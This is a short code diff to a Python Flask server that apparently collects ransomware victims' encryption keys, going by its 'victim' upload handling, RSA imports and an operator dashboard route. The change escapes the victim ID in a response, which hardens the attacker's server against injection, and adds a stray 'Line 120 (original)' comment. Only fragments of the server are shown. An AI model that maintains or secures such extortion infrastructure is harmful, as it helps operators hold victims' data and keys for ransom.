@@ -13,7 +13,7 @@ import os
 import json
 import base64
 import re
-from flask import Flask, request, render_template_string
+from flask import Flask, request, render_template_string, escape as flask_escape
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
 
@@ -117,10 +117,10 @@ def upload():
         return "Server error: Could not write victim data.", 500
     except Exception as e:
         app.logger.error(f"Error processing key for victim {victim_id}: {e}")
-        return "Error processing key.", 500
+        return "Error processing key.", 500 # Line 120 (original)
 
     print(f"Saved victim: {victim_id}")
-    return f"Victim {victim_id} received.", 200
+    return f"Victim {flask_escape(victim_id)} received.", 200
 
 
 @app.route("/dashboard")
